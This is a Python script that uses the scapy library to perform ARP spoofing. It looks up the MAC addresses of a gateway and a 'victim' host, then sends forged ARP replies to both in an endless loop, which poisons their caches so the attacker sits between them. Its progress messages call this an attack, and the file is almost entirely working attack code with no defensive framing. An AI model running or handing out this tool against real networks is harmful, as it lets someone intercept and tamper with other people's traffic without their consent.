from scapy.all import *
from colorama import *


def arp_spoofing(victim_ip, gateway_ip, interface):
    print(Fore.YELLOW + f"    [!] Probing gateway " + gateway_ip + "...")  # Переведено
    arp_request_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip)
    result = srp1(arp_request_for_gateway, timeout=2, verbose=False, iface=interface)
    if result:
        for received in result:
            if received.haslayer(ARP) and received[ARP].op == 2:
                gateway_mac = received.hwsrc
                print(Fore.GREEN + f"    [+] Gateway MAC address: " + gateway_mac.upper())  # Переведено

                print(Fore.YELLOW + f"\n    [!] Probing victim " + victim_ip + "...")  # Переведено
                arp_request_for_victim = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=victim_ip)
                result = srp1(arp_request_for_victim, timeout=2, verbose=False, iface=interface)
                if result:
                    for received in result:
                        if received.haslayer(ARP) and received[ARP].op == 2:
                            victim_mac = received.hwsrc
                            print(Fore.GREEN + f"    [+] Victim MAC address: " + victim_mac.upper())  # Переведено
                            print(Fore.GREEN + f"\n    [+] Attack is running... (Press Ctrl + C to Stop)")  # Переведено

                            try:
                                while True:
                                    forced_response_for_victim = Ether(dst=victim_mac) / ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
                                    sendp(forced_response_for_victim, iface=interface, verbose=False, count=1)

                                    forced_response_for_gateway = Ether(src=victim_mac, dst=gateway_mac) / ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)
                                    sendp(forced_response_for_gateway, iface=interface, verbose=False, count=1)

                                    time.sleep(5)
                            except KeyboardInterrupt:
                                print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

                else:
                    print(Fore.RED + f"    [-] %ERROR: Victim unreachable! (attack aborted)")  # Переведено
    else:
        print(Fore.RED + f"    [-] %ERROR: Gateway unreachable! (attack aborted)")  # Переведено